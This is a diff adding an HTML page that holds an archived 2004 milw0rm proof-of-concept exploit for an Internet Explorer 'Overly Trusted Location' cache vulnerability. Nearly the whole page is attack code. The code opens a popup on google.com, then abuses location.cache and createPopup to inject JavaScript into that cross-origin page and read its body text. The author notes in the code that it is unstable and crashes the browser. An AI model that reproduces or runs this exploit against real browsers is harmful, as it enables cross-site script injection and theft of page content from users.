@@ -1,0 +1,34 @@
+<html>
+<head>
+<title>MS Internet Explorer Overly Trusted Location Cache Exploit</title>
+<pre>
+&lt;html&gt;
+&lt;body&gt;
+&lt;b&gt;&lt;font size=&quot;5&quot;&gt;Overly Trusted Location Variant Method Cache Vulnerability&lt;/font&gt;&lt;/b&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;a href=&quot;#refresh&quot; onclick=&quot;setTimeout('document.execCommand(\'Refresh\')',1000);&quot;&gt;&lt;font size=4 color=red&gt;GO!&lt;/font&gt;&lt;/a&gt;&lt;br&gt;&lt;
++br&gt;
+This vulnerability seems to be unstable. For some reason, it crashes my internet explorer unless the exploit is executed onlo
++ad and even then it crashes sometimes.
+&lt;br&gt;&lt;br&gt;
+
+&lt;script&gt;
+
+var w=window.open(&quot;javascript:''&quot;,&quot;_blank&quot;,&quot;width=100,height=100,left=300,top=300&quot;);
+var cpop=w.createPopup();
+w.location.assign(&quot;http://google.com&quot;);
+cpop.document.body.innerHTML='&lt;button onactivate=&quot;document.parentWindow.location.cache=parent.open;var myint=setInterval(func
++tion(){try{var testvar=parent.document.write;}catch(e){clearInterval(myint);document.parentWindow.location.cache(\'javascrip
++t:alert(\\\'Javascript injected!\\\'+document.body.innerText)\',\'_self\')}},1000 /* theres some ratio of this number to the
++ chance of internet explorer crashing at offset 0019d19d :) */);&quot;&gt;&lt;/button&gt;';
+cpop.show(1,1,1,1);
+
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+// milw0rm.com [2004-07-18]
+</pre>
+</html>
+
